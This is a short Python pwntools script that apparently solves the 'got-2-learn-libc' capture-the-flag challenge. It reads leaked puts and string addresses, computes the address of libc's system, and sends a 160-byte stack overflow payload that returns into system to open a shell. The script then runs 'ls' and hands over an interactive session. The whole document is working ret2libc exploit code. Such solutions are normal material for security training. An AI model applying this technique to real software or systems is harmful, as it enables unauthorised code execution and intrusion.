#!/usr/bin/env python       
#the progrom run in ssh and it in /tmp folder

from pwn import *
import re
local = True

if(local):
	sh= process('./vuln')
	elf = ELF('./vuln')
else:
	sh= process('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')
	elf = ELF('/problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee/vuln')

libc = ELF('/lib32/libc.so.6')

libc_system = libc.symbols['system']
libc_puts = libc.symbols['puts']

alladdr = sh.recv()
puts_addr = re.findall(r'puts: (.*)',alladdr)[0]
puts_addr = int(puts_addr,16)
sh_addr = re.findall(r'useful_string: (.*)',alladdr)[0]
sh_addr = int(sh_addr,16)

system_addr = (puts_addr - libc_puts) + libc_system

payload = 'A'*160 + p32(system_addr) + 'BBBB' + p32(sh_addr)

sh.sendline(payload)
if not local:
	sh.sendline('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee')
sh.sendline('ls')

sh.interactive()
